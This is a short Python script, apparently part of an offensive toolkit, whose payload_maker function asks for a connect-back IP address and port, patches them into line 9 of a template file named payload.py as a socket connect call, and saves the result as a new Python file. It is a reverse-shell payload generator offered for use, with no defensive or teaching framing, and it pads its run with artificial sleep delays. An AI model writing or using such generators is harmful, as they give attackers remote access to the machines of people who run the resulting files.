from colored import fg
import os
import time

green = fg("green")
red = fg("red")
blue = fg("blue")


def payload_maker():
    try:
        for _ in range(0,1):
            print(" ")
            host = str(input(green + "[#] Enter the ip to connect back > "))
            port = int(input("[#] Enter the port to connect back >  "))
            new_file = str(input("[#] Enter the file name to be made (file.py) > "))
            if ".py" not in new_file:
                print(red + "[-] Invalid file extension ")
                break

            file = open("payload.py", "r")
            lines = file.readlines()
            lines[9] = ("        c.connect((" + "'" + str(host) + "'" + "," + str(port) + " ))\n")

            file.close()

            file1 = open(new_file, "a")
            file1.writelines(lines)
            file1.close()
            path = os.getcwd()
            print(" ")
            print(blue + "[#] Creating the payload")
            time.sleep(2)
            print(blue + "[#] This will take some time")
            time.sleep(15)
            print(" ")
            print(blue + "[+] Payload saved in " + str(path) + "\\" + str(new_file))
    except:
        print(red + "[-] Invalid file name")
